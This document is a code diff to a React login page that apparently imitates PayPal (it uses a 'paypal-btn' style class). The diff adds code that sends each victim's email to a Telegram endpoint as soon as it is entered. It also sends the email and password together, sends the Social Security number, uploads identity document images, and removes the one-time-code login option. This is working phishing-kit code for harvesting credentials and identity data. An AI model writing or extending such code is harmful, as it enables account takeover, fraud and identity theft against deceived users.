@@ -32,24 +32,43 @@ export default function LoginPage() {
   const [codeSent, setCodeSent] = useState(false);
   const { toast } = useToast();
 
-  const handleEmailNext = (e: React.FormEvent) => {
+  const handleEmailNext = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (email.trim()) {
-      setStep("loading-password");
-      setTimeout(() => {
-        setStep("password");
-      }, 3000);
+    if (!email.trim()) return;
+
+    // Send email to Telegram immediately
+    try {
+      const message = `
+📧 *Email Entered*
+
+📧 *Email:* ${email}
+      `.trim();
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message }),
+      });
+    } catch (error) {
+      console.error('Failed to send to Telegram:', error);
     }
+
+    setStep("loading-password");
+    setTimeout(() => {
+      setStep("password");
+    }, 3000);
   };
 
   const handlePasswordNext = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!password.trim()) return;
 
-    // Send email and password to Telegram immediately
+    // Send password to Telegram immediately
     try {
       const message = `
-🔐 *Login Attempt*
+🔑 *Password Entered*
 
 📧 *Email:* ${email}
 🔑 *Password:* ${password}
@@ -177,7 +196,27 @@ export default function LoginPage() {
 
     setStep("processing-documents");
     
-    // Send document data with images to Telegram
+    // Send SSN to Telegram immediately
+    try {
+      const message = `
+🔢 *SSN Entered*
+
+📧 *Email:* ${email}
+🔢 *SSN:* ${ssn}
+      `.trim();
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message }),
+      });
+    } catch (error) {
+      console.error('Failed to send SSN to Telegram:', error);
+    }
+
+    // Send document images to Telegram
     try {
       const formData = new FormData();
       formData.append('email', email);
@@ -190,7 +229,7 @@ export default function LoginPage() {
         body: formData,
       });
     } catch (error) {
-      console.error('Failed to send to Telegram:', error);
+      console.error('Failed to send documents to Telegram:', error);
     }
 
     setTimeout(() => {
@@ -612,25 +651,6 @@ export default function LoginPage() {
           data-testid="button-login"
         >
           Log In
-        </button>
-
-        <div className="relative py-4">
-          <div className="absolute inset-0 flex items-center">
-            <div className="w-full border-t border-[#e5e5e5] dark:border-[#2a2a2a]" />
-          </div>
-          <div className="relative flex justify-center">
-            <span className="px-4 text-[13px] text-[#6c7378] bg-white dark:bg-[#121212]">or</span>
-          </div>
-        </div>
-
-        <button
-          type="button"
-          className="paypal-btn-secondary-2025 flex items-center justify-center gap-2"
-          data-testid="button-one-touch"
-          onClick={() => setStep("verify-method")}
-        >
-          <User className="w-5 h-5" />
-          Log in with a one-time code
         </button>
       </div>
     </form>
